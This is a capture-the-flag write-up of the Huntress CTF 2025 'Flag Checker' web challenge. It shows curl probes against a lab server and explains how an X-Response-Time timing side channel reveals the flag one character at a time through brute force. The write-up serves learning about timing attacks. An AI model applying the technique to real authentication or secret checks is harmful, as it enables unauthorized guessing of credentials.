---

layout: post
title: "Huntress CTF 2025 - Flag Checker"
categories: writeup web 
permalink: :categories/:title

---

## Challenge Description

>We've decided to make this challenge really straight forward. All you have to do is find out the flag!
>
>
>Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks...

---
## Thought process

After sending request and looking and responses and also knowing the flag format:

I tested multiple scenarios and noticed one thing:

```bash
curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=f
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:53:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.101613

curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=a
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:53:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.001067

curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=b
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:54:06 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.001057

```


Notice anything that stands out. Lets try with this one, remember we know flag format is `flag\{[0-9a-f]{32}\}`
So basically 32 characters of hex numbers between the {}

Now look at these two requests:
```bash
curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=flag
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:56:39 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.401796

curl -s -D - -o /dev/null http://10.1.221.57/submit?flag=test
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Oct 2025 14:56:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: keep-alive
X-Response-Time: 0.000985
```

We can see that when a character is correct, the `X-Response-Time` has noticeably longer response time then the others(~0.1s). With this knowledge we can "bruteforce" the flag. So I wrote really bad script that tested all 0-9a-f and then when it found the character that has `X-Response-Time` greater then the others saves it and continues with the next character. 